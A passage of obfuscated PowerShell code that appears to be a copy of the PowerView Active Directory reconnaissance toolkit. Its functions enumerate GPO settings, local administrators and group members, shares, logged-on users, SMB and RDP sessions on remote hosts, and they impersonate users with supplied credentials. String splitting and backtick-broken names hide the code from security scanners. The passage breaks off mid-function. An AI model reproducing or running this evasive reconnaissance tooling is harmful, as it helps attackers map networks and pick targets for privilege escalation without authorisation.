        if ($PSBoundParameters[(  "{1}{0}" -f'rver','Se' )] ) { $SearcherArguments[("{2}{0}{1}" -f'v','er','Ser'  )]  =   $Server }
        if (  $PSBoundParameters[("{1}{0}{2}{4}{3}" -f'verTi','Ser','m','t','eLimi'  )] ) { $SearcherArguments[(  "{0}{3}{2}{1}"-f 'Ser','t','meLimi','verTi' )]   = $ServerTimeLimit }
        if ($PSBoundParameters[(  "{2}{1}{0}"-f 'l','edentia','Cr')]  ) { $SearcherArguments[(  "{0}{2}{1}" -f 'Cred','ial','ent')]   = $Credential }

        $ConvertArguments   = @{}
        if ( $PSBoundParameters[(  "{1}{0}{2}" -f 'erv','S','er')] ) { $ConvertArguments[("{0}{1}" -f 'Ser','ver' )]   = $Server }
        if ( $PSBoundParameters[("{1}{0}{2}"-f'dentia','Cre','l' )]) { $ConvertArguments[( "{0}{2}{1}" -f 'Cr','ial','edent')]  =   $Credential }
    }

    PROCESS {
        if ($PSBoundParameters[("{0}{1}"-f'Do','main' )]) {
            $SearcherArguments[(  "{1}{0}"-f 'omain','D')] =   $Domain
            $ConvertArguments[("{1}{0}"-f 'in','Doma'  )] = $Domain
        }

        if ( $Policy -eq 'All'  ) {
            $SearcherArguments[("{1}{2}{0}"-f'tity','Id','en' )] =  '*'
        }
        elseif (  $Policy -eq ( "{0}{1}{2}"-f 'Dom','ai','n')) {
            $SearcherArguments[( "{0}{1}" -f'Ide','ntity')]  =  '{31B2F340-016D-11D2-945F-00C04FB984F9}'
        }
        elseif (  ($Policy -eq ("{2}{3}{0}{4}{1}"-f 'on','r','Dom','ainC','trolle')  ) -or ($Policy -eq 'DC') ) {
            $SearcherArguments[(  "{1}{2}{0}" -f'ntity','I','de'  )]  =  '{6AC1786C-016F-11D2-945F-00C04FB984F9}'
        }
        else {
            $SearcherArguments[(  "{0}{1}{2}"-f'Ide','n','tity')] = $Policy
        }

        $GPOResults = Get-DomainGPO @SearcherArguments

        ForEach (  $GPO in $GPOResults ) {
            
            $GptTmplPath   =  $GPO.GpCfilesYSPatH   +   ((  (  "{6}{10}{5}{3}{0}{9}{2}{4}{8}{7}{1}" -f' NT{','.inf','cEdit{0}G','Windows','p','soft{0}','{0}MACHI','Tmpl','t','0}Se','NE{0}Micro'))-F [chAr]92)

            $ParseArgs  =    @{
                ( "{1}{3}{0}{2}"-f'mplP','Gp','ath','tT'  ) =  $GptTmplPath
                ("{2}{0}{3}{1}"-f'tp','t','Ou','utObjec'  )   = $True
            }
            if (  $PSBoundParameters[(  "{0}{1}{2}" -f 'Cred','e','ntial' )]  ) { $ParseArgs[(  "{0}{2}{1}"-f 'Cre','ential','d')]  =   $Credential }

            
            Get-GptTmpl @ParseArgs | ForEach-Object {
                $_  | Add-Member (  'Note' +  'pro'  +  'pert'+  'y' ) ("{2}{1}{0}"-f 'me','ONa','GP' ) $GPO.NaME
                $_   | Add-Member ('Note'+ 'pr'  +  'o'+'perty' ) ( "{3}{1}{2}{0}"-f 'ame','POD','isplayN','G'  ) $GPO.dIsPlAyNAME
                $_
            }
        }
    }
}










function gE`T-nET`lOcaLgR`O`Up {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{0}{2}{3}{1}" -f 'PSShouldPr','ss','o','ce'}, '' )]
    [OutputType( {"{2}{3}{1}{5}{4}{0}"-f 'up.API','i','Po','werV','w.LocalGro','e'}  )]
    [OutputType({"{1}{2}{4}{6}{3}{0}{5}" -f'p.WinN','Powe','rV','u','iew.Lo','T','calGro'} )]
    [CmdletBinding( )]
    Param(  
        [Parameter(POsiTIoN = 0, vAluefroMpipeLINE  = $True, VALuEFrOmPIpElINebYPrOPeRtYnAmE  = $True  )]
        [Alias( {"{0}{2}{1}"-f'Ho','e','stNam'}, {"{1}{0}{2}"-f'n','dnshost','ame'}, {"{1}{0}"-f 'ame','n'})]
        [ValidateNotNullOrEmpty(  )]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,

        [ValidateSet(  'API', {"{0}{1}"-f'W','inNT'})]
        [Alias({"{0}{2}{3}{1}"-f 'C','onMethod','oll','ecti'}  )]
        [String]
        $Method   = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(   )]
        $Credential   =  [Management.Automation.PSCredential]::EmPtY
      )

    BEGIN {
        if (  $PSBoundParameters[(  "{1}{0}{2}"-f'edentia','Cr','l')] ) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ( $Computer in $ComputerName) {
            if ($Method -eq 'API'  ) {
                

                
                $QueryLevel  =   1
                $PtrInfo  =  [IntPtr]::ZERo
                $EntriesRead  =   0
                $TotalRead  =  0
                $ResumeHandle   = 0

                
                $Result =   $Netapi32::NetlocALGROUpenUM($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle  )

                
                $Offset   =   $PtrInfo.TOInT64(    )

                
                if ( ($Result -eq 0  ) -and ( $Offset -gt 0 )) {

                    
                    $Increment = $LOCALGROUP_INFO_1::gEtSiZE(   )

                    
                    for ( $i = 0; (  $i -lt $EntriesRead  ) ;  $i++ ) {
                        
                        $NewIntPtr  = New-Object ('System'  + '.Intp'+ 't'+'r'  ) -ArgumentList $Offset
                        $Info = $NewIntPtr -as $LOCALGROUP_INFO_1

                        $Offset   =  $NewIntPtr.toinT64(  )
                        $Offset += $Increment

                        $LocalGroup  = New-Object (  'PS'+  'Object')
                        $LocalGroup   | Add-Member (  'Notep'+'ro'+'pe'+'rty') ( "{1}{3}{2}{0}" -f 'terName','C','mpu','o' ) $Computer
                        $LocalGroup |   Add-Member ('Notep'  +  'rop' +  'erty'  ) (  "{2}{1}{0}"-f 'oupName','r','G') $Info.lgRpI1_namE
                        $LocalGroup   |  Add-Member ( 'N'  + 'ote'+ 'proper'  + 'ty' ) (  "{1}{0}{2}"-f 'om','C','ment' ) $Info.lGRpi1_CoMmENT
                        $LocalGroup.PsObJEct.typeNaMEs.inSeRt( 0, (  "{2}{4}{0}{1}{6}{3}{5}" -f 'rView','.Loca','Pow','up','e','.API','lGro' ))
                        $LocalGroup
                    }
                    
                    $Null  =   $Netapi32::NetApIbuFFerfReE($PtrInfo)
                }
                else {
                    Write-Verbose "[Get-NetLocalGroup] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
                }
            }
            else {
                
                $ComputerProvider  =  [ADSI]"WinNT://$Computer,computer"

                $ComputerProvider.psBAsE.cHILDRen | Where-Object { $_.PsBaSE.SCHeMacLASsnaME -eq ("{0}{1}"-f 'gr','oup' ) } | ForEach-Object {
                    $LocalGroup = ( [ADSI]$_  )
                    $Group  =  New-Object (  'P' +'SObje'+'ct' )
                    $Group  |   Add-Member (  'N'  + 'o' +'tepr'  + 'operty' ) ("{3}{2}{0}{1}" -f 'N','ame','mputer','Co'  ) $Computer
                    $Group | Add-Member ( 'No'+  'teprope'+  'r'  +'ty'  ) ("{0}{1}{2}"-f'Gro','upNam','e'  ) (  $LocalGroup.InvOKEGeT(  (  "{1}{0}"-f'ame','N'  )  ) )
                    $Group  |  Add-Member (  'N'  +  'oteprop' +  'erty'  ) 'SID' ( (  New-Object ('Sys' + 't'  + 'em.Sec'+'u'+ 'r'  +'i'+  'ty'  +  '.Principal'+'.Sec'+ 'urityIdent' + 'ifier' )($LocalGroup.INVOkegEt(("{1}{2}{0}"-f'd','objects','i' )),0 ) ).vALUE )
                    $Group  |  Add-Member ( 'Not'+ 'eproper'  + 'ty'  ) ( "{2}{0}{1}"-f 'omm','ent','C') (  $LocalGroup.INVOkEgEt(("{1}{0}{2}"-f'ti','Descrip','on'  )) )
                    $Group.PSOBJect.TyPenAmEs.InSErt(0, (  "{4}{0}{1}{3}{2}" -f 'wer','View.L','up.WinNT','ocalGro','Po'  )  )
                    $Group
                }
            }
        }
    }
    
    END {
        if (  $LogonToken ) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NeTL`Oca`lg`ROupmEmBER {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{0}{1}{3}{2}" -f 'PSS','hould','ss','Proce'}, ''  )]
    [OutputType(  {"{3}{7}{6}{5}{4}{9}{0}{2}{1}{8}" -f'oup','m','Me','P','o','iew.L','rV','owe','ber.API','calGr'}  )]
    [OutputType(  {"{3}{5}{1}{4}{2}{0}"-f'T','ocalGroup','WinN','PowerView.','Member.','L'})]
    Param( 
        [Parameter(  pOsItIOn =  0, VaLuefRompiPElINE =  $True, vALUEFRompIpeLINeBypROPertyname   =   $True  )]
        [Alias({"{1}{0}"-f 'me','HostNa'}, {"{2}{0}{1}{3}" -f 'nsho','s','d','tname'}, {"{1}{0}"-f'ame','n'}  )]
        [ValidateNotNullOrEmpty(  )]
        [String[]]
        $ComputerName  = $Env:COMPUTERNAME,

        [Parameter(  VALUEFroMpipElIneBYProPERtyName =  $True )]
        [ValidateNotNullOrEmpty(  )]
        [String]
        $GroupName  = ( "{3}{2}{0}{1}" -f't','rators','nis','Admi' ),

        [ValidateSet(  'API', {"{1}{0}" -f 'T','WinN'}  )]
        [Alias(  {"{0}{1}{3}{2}"-f'Colle','cti','od','onMeth'})]
        [String]
        $Method   =   'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(  )]
        $Credential   =  [Management.Automation.PSCredential]::eMpTY
    )

    BEGIN {
        if ( $PSBoundParameters[("{1}{0}{2}{3}"-f 'de','Cre','nti','al')]) {
            $LogonToken  = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName ) {
            if (  $Method -eq 'API') {
                

                
                $QueryLevel  = 2
                $PtrInfo   = [IntPtr]::zERO
                $EntriesRead  = 0
                $TotalRead  = 0
                $ResumeHandle   =   0

                
                $Result  =  $Netapi32::NEtlOcalGrOUPGetmEMbeRS(  $Computer, $GroupName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle )

                
                $Offset   =  $PtrInfo.toINT64(    )

                $Members   =   @( )

                
                if ( ($Result -eq 0  ) -and (  $Offset -gt 0)) {

                    
                    $Increment   =   $LOCALGROUP_MEMBERS_INFO_2::geTsiZE(  )

                    
                    for (  $i = 0;   (  $i -lt $EntriesRead) ;  $i++  ) {
                        
                        $NewIntPtr  = New-Object ('System.I'+  'ntpt' +'r'  ) -ArgumentList $Offset
                        $Info  = $NewIntPtr -as $LOCALGROUP_MEMBERS_INFO_2

                        $Offset   = $NewIntPtr.TOiNT64(  )
                        $Offset += $Increment

                        $SidString =   ''
                        $Result2  =   $Advapi32::ConVERTsIdTOStRIngSid($Info.lGrMi2_SID, [ref]$SidString) ; $LastError  = [Runtime.InteropServices.Marshal]::GETLasTwiN32ErROr(  )

                        if (  $Result2 -eq 0  ) {
                            Write-Verbose "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                        }
                        else {
                            $Member =  New-Object ('P'+  'SOb'  +'ject')
                            $Member  |  Add-Member ( 'N'  + 'otepr'  + 'ope'+ 'rty') (  "{1}{2}{0}{3}"-f 'puterNam','Co','m','e'  ) $Computer
                            $Member   |   Add-Member ( 'N' +'otepro'  +  'perty'  ) (  "{0}{2}{1}" -f 'Gro','pName','u' ) $GroupName
                            $Member   | Add-Member (  'Noteprop'+'e'  + 'rty'  ) ("{0}{1}{2}" -f 'Membe','rN','ame') $Info.LgRMi2_dOmAiNAndnAme
                            $Member  | Add-Member (  'Not'  +  'e' + 'property'  ) 'SID' $SidString
                            $IsGroup  =   $($Info.LgRmi2_SIDusage -eq ( "{0}{2}{1}"-f 'Sid','peGroup','Ty'))
                            $Member   |  Add-Member (  'No'+  'tep'+'rop'+  'erty' ) ( "{2}{1}{0}"-f'oup','r','IsG') $IsGroup
                            $Member.PsobJeCT.tyPEnAmes.inSert(0, ("{5}{0}{3}{6}{4}{2}{1}"-f 'w.Loca','ber.API','m','l','e','PowerVie','GroupM'  )  )
                            $Members += $Member
                        }
                    }

                    
                    $Null  = $Netapi32::NEtAPiBuffErFrEe($PtrInfo  )

                    
                    $MachineSid  =  $Members |   Where-Object {$_.siD -match (  "{1}{0}"-f '-500','.*'  ) -or ($_.Sid -match ( "{1}{0}"-f'501','.*-'))} |   Select-Object -Expand (  'SI' + 'D')
                    if (  $MachineSid) {
                        $MachineSid =  $MachineSid.subSTRING(  0, $MachineSid.lAstindExof('-' ))

                        $Members |   ForEach-Object {
                            if ($_.sID -match $MachineSid ) {
                                $_  |   Add-Member (  'N'+ 'oteprop'+  'erty'  ) (  "{1}{2}{0}"-f'in','IsDo','ma') $False
                            }
                            else {
                                $_   |  Add-Member ( 'Notep' +  'r' + 'operty') ( "{0}{1}"-f 'IsDomai','n' ) $True
                            }
                        }
                    }
                    else {
                        $Members   |   ForEach-Object {
                            if ($_.sId -notmatch ("{2}{0}{1}"-f'1-','5-21','S-' )) {
                                $_   |  Add-Member ( 'Not'  + 'epr'  +'op'  + 'erty' ) ( "{1}{0}"-f'main','IsDo' ) $False
                            }
                            else {
                                $_   |  Add-Member ( 'Notep' +  'ropert'  +'y') ( "{1}{2}{0}"-f 'n','I','sDomai' ) ( "{0}{1}{2}"-f 'U','NK','NOWN' )
                            }
                        }
                    }
                    $Members
                }
                else {
                    Write-Verbose "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
                }
            }
            else {
                
                try {
                    $GroupProvider  =   [ADSI]"WinNT://$Computer/$GroupName,group"

                    $GroupProvider.pSBaSE.INvOKe(( "{0}{1}"-f'Memb','ers' ) )   |  ForEach-Object {

                        $Member   = New-Object ('PSO'+ 'bject'  )
                        $Member  | Add-Member ( 'N' +'ot'+'eprop'  +  'erty' ) (  "{2}{1}{3}{0}" -f'e','terNa','Compu','m') $Computer
                        $Member  | Add-Member ( 'No'+'tepro'  +  'per'  + 'ty'  ) ( "{1}{0}{2}"-f 'r','G','oupName' ) $GroupName

                        $LocalUser  =  ([ADSI]$_)
                        $AdsPath  = $LocalUser.INvOKEgEt(("{0}{1}" -f 'A','dsPath')).RepLaCe(("{1}{0}{2}" -f 'in','W','NT://' ), '' )
                        $IsGroup   =  (  $LocalUser.SCHEMaClaSSnAME -like ( "{0}{1}" -f 'gro','up'  ))

                        if(  (  [regex]::mATCHES( $AdsPath, '/' )  ).cOUNT -eq 1 ) {
                            
                            $MemberIsDomain  = $True
                            $Name =  $AdsPath.RepLaCE('/', '\')
                        }
                        else {
                            
                            $MemberIsDomain   =  $False
                            $Name  = $AdsPath.sUBSTriNg(  $AdsPath.INdexoF('/')  +  1 ).RePlAcE( '/', '\')
                        }

                        $Member   | Add-Member ('N' +  'ote' + 'p' +'roperty'  ) ( "{0}{2}{1}{3}" -f 'Ac','o','c','untName' ) $Name
                        $Member   | Add-Member ('No'+'tepr'  +'operty'  ) 'SID' (  (  New-Object ('Syste'+  'm.Sec'  +  'u'+  'r'+  'ity.Pr'  +  'i'+  'ncipal.Securit'+'yIdentifier' )(  $LocalUser.INVokegET(("{1}{2}{0}"-f 'D','Obj','ectSI' )  ),0 ) ).VAluE )
                        $Member   | Add-Member (  'N' + 'ot' + 'epro'  + 'perty'  ) ("{0}{1}" -f 'I','sGroup') $IsGroup
                        $Member   | Add-Member ( 'Notep' +  'r' +  'ope'  +  'rty'  ) ( "{1}{0}" -f'ain','IsDom'  ) $MemberIsDomain

                        
                        
                        
                        
                        

                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        

                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        

                        $Member
                    }
                }
                catch {
                    Write-Verbose ('[Get-'+ 'Net' +  'L'+'oc' + 'alG'+  'ro' + 'upMember] '  + 'Er'+'ror' +  ' '+ 'f'+'or '+"$Computer " +': '  +"$_")
                }
            }
        }
    }
    
    END {
        if ( $LogonToken ) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function gET-`NetsH`ARe {


    [OutputType( {"{2}{0}{5}{1}{4}{3}" -f'wer','.Sh','Po','eInfo','ar','View'}  )]
    [CmdletBinding(   )]
    Param( 
        [Parameter( posiTIOn   = 0, vALUefrOmPipelIne   =   $True, valUefrOmPIPElinEbYpROpeRtYnAmE =   $True  )]
        [Alias( {"{0}{1}"-f 'HostNam','e'}, {"{2}{1}{3}{0}"-f 'e','sho','dn','stnam'}, {"{1}{0}"-f 'e','nam'} )]
        [ValidateNotNullOrEmpty( )]
        [String[]]
        $ComputerName   = ( "{1}{0}{2}"-f'alhos','loc','t'  ),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(  )]
        $Credential   = [Management.Automation.PSCredential]::EmPTY
     )

    BEGIN {
        if ($PSBoundParameters[("{0}{2}{1}" -f'Cr','l','edentia' )]  ) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ( $Computer in $ComputerName) {
            
            $QueryLevel  =  1
            $PtrInfo   = [IntPtr]::ZEro
            $EntriesRead =  0
            $TotalRead  =   0
            $ResumeHandle  =   0

            
            $Result   = $Netapi32::NEtsHAreenuM(  $Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle )

            
            $Offset =  $PtrInfo.toiNt64()

            
            if ( ( $Result -eq 0) -and (  $Offset -gt 0 )) {

                
                $Increment   =  $SHARE_INFO_1::gETSiZe(  )

                
                for (  $i   =  0;  (  $i -lt $EntriesRead  ) ;   $i++  ) {
                    
                    $NewIntPtr  =  New-Object (  'Syst'  +'em.In'  +'tptr') -ArgumentList $Offset
                    $Info   = $NewIntPtr -as $SHARE_INFO_1

                    
                    $Share =  $Info |  Select-Object ('*')
                    $Share |   Add-Member (  'N'  +'otepro'+  'perty' ) ("{0}{2}{1}"-f 'Computer','me','Na'  ) $Computer
                    $Share.PSoBJEcT.tYPEnAMEs.iNsERT(0, (  "{1}{4}{5}{2}{3}{0}" -f 'eInfo','Po','rVi','ew.Shar','w','e'))
                    $Offset  = $NewIntPtr.ToInT64(  )
                    $Offset += $Increment
                    $Share
                }

                
                $Null   = $Netapi32::nETaPIbufferFRee($PtrInfo )
            }
            else {
                Write-Verbose "[Get-NetShare] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
    }

    END {
        if ( $LogonToken ) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function geT-`NETlOgGE`d`oN {


    [OutputType(  {"{2}{6}{5}{3}{4}{0}{1}"-f'nUserI','nfo','Po','ogg','edO','erView.L','w'} )]
    [CmdletBinding(    )]
    Param( 
        [Parameter(PositiON =  0, VaLuEFROMPipeLInE   = $True, VAluEfroMpiPeLiNEBypROpERtYnAME   =  $True  )]
        [Alias({"{1}{2}{0}" -f 'me','Host','Na'}, {"{0}{2}{1}{3}"-f'd','shostna','n','me'}, {"{0}{1}" -f'na','me'} )]
        [ValidateNotNullOrEmpty(   )]
        [String[]]
        $ComputerName   = ("{2}{1}{0}"-f 'st','o','localh'  ),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(   )]
        $Credential = [Management.Automation.PSCredential]::EMpty
    )

    BEGIN {
        if (  $PSBoundParameters[(  "{1}{3}{2}{0}"-f'ial','Cre','ent','d')]) {
            $LogonToken =   Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            
            $QueryLevel   =   1
            $PtrInfo  =   [IntPtr]::zErO
            $EntriesRead   =   0
            $TotalRead   =  0
            $ResumeHandle =  0

            
            $Result  =  $Netapi32::netWkstAUsEreNUM( $Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle  )

            
            $Offset   =   $PtrInfo.toinT64(    )

            
            if ( ( $Result -eq 0) -and (  $Offset -gt 0 )) {

                
                $Increment  = $WKSTA_USER_INFO_1::GetSIzE(  )

                
                for ($i = 0 ; (  $i -lt $EntriesRead  );  $i++ ) {
                    
                    $NewIntPtr  =  New-Object (  'Syst' +'em' +'.Int' +  'p' +'tr') -ArgumentList $Offset
                    $Info   = $NewIntPtr -as $WKSTA_USER_INFO_1

                    
                    $LoggedOn =  $Info  |  Select-Object ('*')
                    $LoggedOn |  Add-Member ( 'No'  + 'tepr'+ 'op' +'erty'  ) (  "{3}{1}{2}{0}" -f 'me','omput','erNa','C'  ) $Computer
                    $LoggedOn.PsobjeCt.TyPENAMes.INsERT(0, ("{5}{0}{4}{2}{1}{3}{7}{6}"-f 'iew.L','O','ed','nUse','ogg','PowerV','Info','r') )
                    $Offset   =   $NewIntPtr.TOINt64(  )
                    $Offset += $Increment
                    $LoggedOn
                }

                
                $Null  =  $Netapi32::nETaPIbuFFerfrEE(  $PtrInfo )
            }
            else {
                Write-Verbose "[Get-NetLoggedon] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
    }

    END {
        if (  $LogonToken  ) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function GEt`-nEt`se`sS`iON {


    [OutputType(  {"{3}{0}{4}{2}{1}"-f'erView','onInfo','ssi','Pow','.Se'}  )]
    [CmdletBinding(    )]
    Param( 
        [Parameter(  posItIoN  = 0, vALUEfrompIpELine   =   $True, ValueFROMpipElinEBYpropERTYnaME  =  $True)]
        [Alias( {"{0}{1}{2}"-f 'Host','Na','me'}, {"{1}{0}{2}"-f 'ostna','dnsh','me'}, {"{1}{0}" -f'e','nam'})]
        [ValidateNotNullOrEmpty(   )]
        [String[]]
        $ComputerName =   ( "{1}{2}{0}"-f 'st','lo','calho'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute( )]
        $Credential   =  [Management.Automation.PSCredential]::eMpTy
      )

    BEGIN {
        if ($PSBoundParameters[("{1}{2}{0}" -f'ial','C','redent')]) {
            $LogonToken  =  Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach (  $Computer in $ComputerName ) {
            
            $QueryLevel = 10
            $PtrInfo = [IntPtr]::zero
            $EntriesRead   =  0
            $TotalRead  =   0
            $ResumeHandle  =  0

            
            $Result  =  $Netapi32::NETseSSIONeNUm(  $Computer, '', $UserName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle )

            
            $Offset = $PtrInfo.toiNT64()

            
            if (  (  $Result -eq 0 ) -and ( $Offset -gt 0)  ) {

                
                $Increment  =  $SESSION_INFO_10::gEtSIzE(   )

                
                for ( $i   =  0 ;  (  $i -lt $EntriesRead)  ;  $i++) {
                    
                    $NewIntPtr =  New-Object (  'System.'  +  'In'+'tp' +'tr') -ArgumentList $Offset
                    $Info  =   $NewIntPtr -as $SESSION_INFO_10

                    
                    $Session  =  $Info   | Select-Object (  '*')
                    $Session   | Add-Member ( 'Notep' + 'roper'  +  'ty') (  "{2}{0}{3}{1}" -f'omputerNa','e','C','m' ) $Computer
                    $Session.psOBJeCT.tyPEnaMES.insERt(0, (  "{5}{1}{4}{2}{0}{3}{6}" -f'e','rVie','S','ssionI','w.','Powe','nfo' ))
                    $Offset   =  $NewIntPtr.tOINt64(   )
                    $Offset += $Increment
                    $Session
                }

                
                $Null   =   $Netapi32::NetaPiBUffERfree( $PtrInfo  )
            }
            else {
                Write-Verbose "[Get-NetSession] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
    }


    END {
        if (  $LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function GE`T-rE`GLoGGeD`oN {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(  {"{1}{0}{2}{4}{3}" -f'SS','P','hould','cess','Pro'}, '')]
    [OutputType(  {"{6}{5}{4}{7}{0}{3}{2}{1}"-f'gg','er','dOnUs','e','View.','wer','Po','RegLo'})]
    [CmdletBinding(   )]
    Param(  
        [Parameter(  POSITIoN  =  0, vALUefROmpipeLINE  =   $True, valuefrOmpIPelINeByPROpeRTYnaME = $True)]
        [Alias( {"{1}{0}{2}"-f'o','H','stName'}, {"{0}{1}{2}" -f'dnshos','tnam','e'}, {"{1}{0}"-f'e','nam'}  )]
        [ValidateNotNullOrEmpty(  )]
        [String[]]
        $ComputerName   =   (  "{0}{1}{2}"-f 'local','hos','t')
    )

    BEGIN {
        if ( $PSBoundParameters[( "{1}{0}{2}"-f'denti','Cre','al')] ) {
            $LogonToken   =   Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ( $Computer in $ComputerName) {
            try {
                
                $Reg  = [Microsoft.Win32.RegistryKey]::OPenRemOTEBasekeY(  ("{1}{0}"-f 'sers','U'), "$ComputerName" )

                
                $Reg.GETSUbKEyNAmES(  )  |   Where-Object { $_ -match (( ( 'S-'  + '1'+  '-'+ '5-' + '21-[0'+ '-9'  +']+' + '-[0-' +  '9'  +']+-[0-9]+'  +'-'  + '[0-9]+u39'  )-rePLACe(  [char]117 +[char]51+  [char]57),[char]36)  ) }   |  ForEach-Object {
                    $UserName =   ConvertFrom-SID -ObjectSID $_ -OutputType ( "{2}{1}{0}" -f 'mple','nSi','Domai')

                    if ( $UserName ) {
                        $UserName, $UserDomain   =   $UserName.SPLit( '@')
                    }
                    else {
                        $UserName = $_
                        $UserDomain   = $Null
                    }

                    $RegLoggedOnUser =   New-Object ( 'P'+  'SObjec'  +  't'  )
                    $RegLoggedOnUser  |   Add-Member (  'No'  +'tepropert'+  'y') ( "{1}{3}{2}{0}" -f'e','C','am','omputerN'  ) "$ComputerName"
                    $RegLoggedOnUser |   Add-Member ('Note'  +  'prop' + 'e' +  'rty' ) ( "{3}{2}{1}{0}"-f 'Domain','r','se','U') $UserDomain
                    $RegLoggedOnUser |   Add-Member (  'No' +'teproper'  +  'ty' ) (  "{1}{0}{2}" -f 'erN','Us','ame'  ) $UserName
                    $RegLoggedOnUser  |  Add-Member ( 'Notepr'  +  'ope'  +'r'+'ty') (  "{1}{0}"-f 'erSID','Us') $_
                    $RegLoggedOnUser.pSoBJecT.typenamEs.InseRT(  0, ("{2}{4}{1}{0}{3}" -f 'ggedOnU','.RegLo','PowerV','ser','iew' ))
                    $RegLoggedOnUser
                }
            }
            catch {
                Write-Verbose (  '[Ge'  +'t'+  '-R' +'egLoggedO' + 'n] '  +'Err' +'or' +  ' '+  'ope' +  'ning '  +'remo' +'te ' +'r' +'egistry' +' '+  'on'  +' ' +  "'$ComputerName' "+  ': '  + "$_")
            }
        }
    }

    END {
        if ( $LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function G`et-N`etR`DPSEsS`I`oN {


    [OutputType(  {"{1}{5}{3}{4}{2}{0}"-f 'nInfo','P','o','ew.RDPSes','si','owerVi'})]
    [CmdletBinding(  )]
    Param( 
        [Parameter(pOSItIOn  = 0, VAlUEFROmPipelINe = $True, vAluefromPIpElInEbyPROPeRtYnAme  =   $True )]
        [Alias(  {"{1}{2}{0}" -f 'e','Hos','tNam'}, {"{1}{2}{0}"-f 'me','d','nshostna'}, {"{0}{1}"-f'n','ame'})]
        [ValidateNotNullOrEmpty(    )]
        [String[]]
        $ComputerName  =  ( "{0}{1}"-f 'local','host'  ),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute( )]
        $Credential =  [Management.Automation.PSCredential]::empty
    )

    BEGIN {
        if ($PSBoundParameters[("{1}{3}{0}{2}" -f'tia','Cred','l','en' )] ) {
            $LogonToken  =  Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach (  $Computer in $ComputerName) {

            
            $Handle   =  $Wtsapi32::wTsOpENSeRVErEX(  $Computer )

            
            if (  $Handle -ne 0 ) {

                
                $ppSessionInfo =   [IntPtr]::Zero
                $pCount  =   0

                
                $Result =   $Wtsapi32::WtSEnuMERATEsESsionseX( $Handle, [ref]1, 0, [ref]$ppSessionInfo, [ref]$pCount  )  ;$LastError  =   [Runtime.InteropServices.Marshal]::getlaStWIN32ErrOr( )

                
                $Offset   =  $ppSessionInfo.TOInt64(  )

                if (  ( $Result -ne 0  ) -and ($Offset -gt 0) ) {

                    
                    $Increment =  $WTS_SESSION_INFO_1::GETsIZe( )

                    
                    for ($i  = 0 ;  ($i -lt $pCount  ) ; $i++) {

                        
                        $NewIntPtr   =  New-Object ('Sy'+  'stem.I'+ 'ntptr'  ) -ArgumentList $Offset
                        $Info  =   $NewIntPtr -as $WTS_SESSION_INFO_1

                        $RDPSession = New-Object ('PSO' +  'bject' )

                        if ( $Info.pHOsTNAMe) {
                            $RDPSession  |  Add-Member ('No'+ 'tepr'  +'op'+  'erty' ) ( "{1}{2}{3}{0}"-f'rName','Co','m','pute') $Info.PhoStNaME
                        }
                        else {
                            
                            $RDPSession |  Add-Member ( 'Note' +  'prop'  + 'erty' ) (  "{0}{1}{2}{3}" -f'Comput','erN','a','me'  ) $Computer
                        }

                        $RDPSession   | Add-Member (  'Noteprope'+'rt'+ 'y' ) ("{1}{0}{2}{3}"-f 'ession','S','Nam','e' ) $Info.psesSiONNAmE

                        if ( $(-not $Info.PDomainnAME ) -or ( $Info.PDoMaINNAMe -eq '' )  ) {
                            
                            $RDPSession   | Add-Member ( 'No'+ 'te'+ 'prop' +'erty'  ) (  "{1}{2}{0}" -f'ame','User','N'  ) "$($Info.pUserName)"
                        }
                        else {
                            $RDPSession  |   Add-Member (  'Not' +'epr' + 'operty'  ) ( "{1}{0}"-f 'Name','User') "$($Info.pDomainName)\$($Info.pUserName)"
                        }

